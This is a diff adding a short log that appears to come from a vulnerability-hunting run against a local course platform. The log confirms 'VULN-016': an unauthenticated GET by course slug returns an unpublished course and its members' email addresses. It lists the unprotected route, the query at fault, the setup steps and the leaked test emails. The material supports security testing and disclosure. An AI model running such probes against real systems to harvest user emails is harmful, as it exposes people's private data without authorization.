@@ -1,0 +1,17 @@
+========================================================================
+VULN-016: Unauth GET /course/slug/:slug leaks private course + member emails
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route apps/api/src/routes/course/course.ts:117 has NO auth middleware
+[INFO] query packages/db/src/queries/course/course.ts:428-436 filters only status='ACTIVE'
+[SETUP] admin login
+[SETUP] course c22036fb-9e60-487f-937b-8b73a6a52f79 slug=cvehunt-016-slug_bed89caa  (db is_published|type|status = f|SELF_PACED|ACTIVE)
+[SETUP] enrolling a STUDENT member (gives the course a roster with a real email)
+[SETUP] member email that must NOT leak to anonymous callers: u_d9e83ea7@cvehunt.local
+[STEP] UNAUTHENTICATED (no cookie) GET /course/slug/cvehunt-016-slug_bed89caa
+[INFO]   response: HTTP 200
+[INFO]   served course: isPublished=False type=SELF_PACED status=ACTIVE
+[INFO]   leaked member roster emails: ['admin@cvehunt.local', 'u_d9e83ea7@cvehunt.local']
+[PROOF] anonymous GET returned an UNPUBLISHED, non-PUBLIC course AND leaked the member email 'u_d9e83ea7@cvehunt.local' in the roster — a pre-auth PII + private-content disclosure
+==> VULN-016: CONFIRMED — unauth by-slug read leaks a private course + member emails
+[OK] exploit confirmed — no authentication, member emails harvested from a draft course
